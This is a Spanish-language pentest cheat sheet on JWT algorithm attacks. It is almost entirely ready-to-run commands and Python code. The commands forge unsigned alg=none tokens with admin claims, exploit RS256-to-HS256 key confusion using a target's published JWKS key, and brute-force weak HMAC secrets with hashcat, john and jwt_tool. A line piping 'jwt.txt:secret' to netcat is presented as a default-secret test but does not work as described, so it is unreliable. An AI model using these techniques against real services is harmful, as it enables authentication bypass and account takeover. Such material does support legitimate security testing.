---
aliases:
  - JWT alg=none
  - JWT Algorithm Confusion
  - JWT Weak Secret
tags:
  - type/technique
  - vuln/jwt
  - vuln/auth-bypass
  - technique/credential-access
  - technique/defense-evasion
  - asset/web-app
  - cred/jwt
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[JWT Attacks]]"
---
# JWT - Ataques al Algoritmo

***

## alg=none Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 jwt_tool.py $JWT -X a` | Auto-genera todas las variantes alg=none | Test rápido alg=none. |
| `python3 -c "import jwt; print(jwt.encode({'sub':'admin','role':'admin'},'',algorithm='none'))"` | Forge token alg=none manual con PyJWT | Custom payload claims. |
| Header `{"alg":"none","typ":"JWT"}` + payload + `.` (signature vacía) | Token forjado standard | Backend acepta `none` directo. |
| Variantes case: `none`/`None`/`NONE`/`nOnE` | Bypass blacklist case-sensitive | Validator solo blacklistea lowercase. |
| `{"alg":""}` (alg empty string) | Bypass via empty alg | Lib interpreta como none. |
| `{"alg":null}` | Bypass via null literal | Algunos parsers tratan null como none. |
| `{"typ":"none","alg":"HS256"}` | Bypass alg-only blacklist | Filter no chequea typ. |
^jwt-alg-none

### Forge alg=none Python

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
print(token)
```

___

## Algorithm Confusion (HS256 ↔ RS256)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -s https://target/.well-known/jwks.json \| jq` | Obtener clave pública RSA | JWKS endpoint disponible. |
| `curl -s https://target/.well-known/openid-configuration \| jq '.jwks_uri' \| xargs curl -s` | Discovery → JWKS | OIDC discovery endpoint. |
| `python3 jwt_tool.py $JWT -X k -pk public.pem` | Auto-confusion RS256 → HS256 | Tenés clave pública. |
| `python3 -c "import jwt; key=open('public.pem').read(); print(jwt.encode({'role':'admin'}, key, algorithm='HS256'))"` | Forge HS256 con pública como secret | PyJWT manual. |
| `tr -d '\n' < public.pem` y reintentar firma | Pública sin newlines | Backend compara bytes exactos sin normalización. |
| `printf "$(cat public.pem)\n"` (con `\n` final extra) | Pública con `\n` agregado | Backend con normalización distinta. |
| `python3 jwk2pem.py jwks.json` (script dedicado) | Convertir JWK → PEM | JWKS solo entrega JWK format. |
^jwt-alg-confusion

### RS256 → HS256 confusion completo

```bash
# 1. Obtener pública
curl -s https://target/.well-known/jwks.json | jq '.keys[0]' > jwk.json

# 2. JWK → PEM
python3 -c "
from jwcrypto import jwk
import json
key = jwk.JWK(**json.load(open('jwk.json')))
print(key.export_to_pem().decode())
" > public.pem

# 3. Forge HS256 con pública como secret
python3 jwt_tool.py "$JWT" -X k -pk public.pem
```

___

## Weak Secret Bruteforce (HS256)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -m 16500 jwt.txt rockyou.txt` | GPU brute HMAC secret | Secret < 12 chars probable. |
| `hashcat -m 16500 jwt.txt rockyou.txt -r best64.rule` | Bruteforce con mutations rule | Cobertura ampliada. |
| `hashcat -m 16500 -a 3 jwt.txt ?l?l?l?l?l?l?l?l` | Mask attack — 8 chars lowercase | Bruteforce sin wordlist. |
| `john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt` | CPU bruteforce alternative | Sin GPU. |
| `jwtcrack $JWT` | Tool dedicada brute charset corto | Secrets cortos. |
| `python3 jwt_tool.py $JWT -C -d /usr/share/wordlists/rockyou.txt` | All-in-one con wordlist | Quick check. |
| `git clone https://github.com/wallarm/jwt-secrets && hashcat -m 16500 jwt.txt jwt-secrets/jwt.secrets.list` | Wordlist específica JWT | Defaults conocidos. |
| `echo -n 'jwt.txt:secret' \| nc target 80` (test default) | Probar secrets defaults manualmente: `secret`, `key`, `password`, `<app-name>` | Quick sanity check. |
^jwt-alg-bruteforce

### Cuándo es factible (referencia)

| Longitud secret | Charset | GPU consumer | Tiempo estimado |
|---|---|---|---|
| 6 chars | a-z | RTX 3090 | < 1 min |
| 8 chars | a-z | RTX 3090 | ~30 min |
| 8 chars | a-zA-Z0-9 | RTX 3090 | ~horas |
| 10 chars | a-zA-Z0-9 | RTX 3090 | meses |
| 12+ chars random | full | — | infactible |

Si secret > 32 bytes random → enfocarse en otros vectores (alg confusion / kid injection / leak).

***
